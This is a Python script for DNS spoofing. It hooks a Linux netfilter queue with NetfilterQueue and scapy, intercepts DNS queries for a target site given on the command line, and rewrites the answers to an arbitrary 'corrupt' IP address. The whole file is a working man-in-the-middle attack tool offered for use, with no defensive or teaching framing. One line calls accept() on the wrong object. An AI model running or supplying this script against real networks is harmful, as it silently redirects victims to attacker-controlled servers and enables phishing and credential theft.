from netfilterqueue import NetfilterQueue, Packet
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR, DNSQR
import argparse
import logging
from functools import partial

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format=' %(asctime)s :: %(levelname)s :: %(message)s')
DEFAULT_NETFILTER_QUEUE_ID = 1


def modify_packet(packet: Packet, ip_packet: IP, corrupt_ip_address: str) -> None:
    new_payload = IP(src=ip_packet[IP].src, dst=ip_packet[IP].dst) / UDP(sport=ip_packet[UDP].sport,
                                                                         dport=ip_packet[UDP].dport) / \
                  DNS(id=ip_packet[DNS].id, qr=1, aa=1, qd=ip_packet[DNS].qd,
                      an=DNSRR(rrname=ip_packet[DNS].qd.qname, ttl=10, rdata=corrupt_ip_address))
    packet.set_payload(bytes(new_payload))


def spoof(packet: Packet, target_site: str, corrupt_ip_address: str) -> None:
    ip_packet = IP(packet.get_payload())
    if not ip_packet.haslayer(DNSQR):
        ip_packet.accept()

    if target_site in ip_packet[DNSQR].qname.decode():
        logger.info(f"Received DNS packet for: '{ip_packet[DNSQR].qname.decode()[:-1]}'. Modifying packet payload.")
        modify_packet(packet, ip_packet, corrupt_ip_address)

    packet.accept()


def get_arguments() -> (str, str):
    parser = argparse.ArgumentParser()
    parser.add_argument('--target-site', required=True, type=str,
                        help='Website address which we want to corrupt its DNS queries')
    parser.add_argument('--corrupt-ip', required=True, type=str,
                        help='IP address that we want to be returned to user when making DNS query for target address')
    args = parser.parse_args()
    return args.target_site, args.corrupt_ip


def start_nfqueue(target_site: str, corrupt_ip: str) -> None:
    nfqueue = NetfilterQueue()
    callback = partial(spoof, target_site=target_site, corrupt_ip_address=corrupt_ip)
    nfqueue.bind(DEFAULT_NETFILTER_QUEUE_ID, callback)
    nfqueue.run()


if __name__ == "__main__":
    target_site, corrupt_ip = get_arguments()
    logger.info(f"Starting spoofing. Website: '{target_site}', Corrupt IP: '{corrupt_ip}'")
    start_nfqueue(target_site, corrupt_ip)
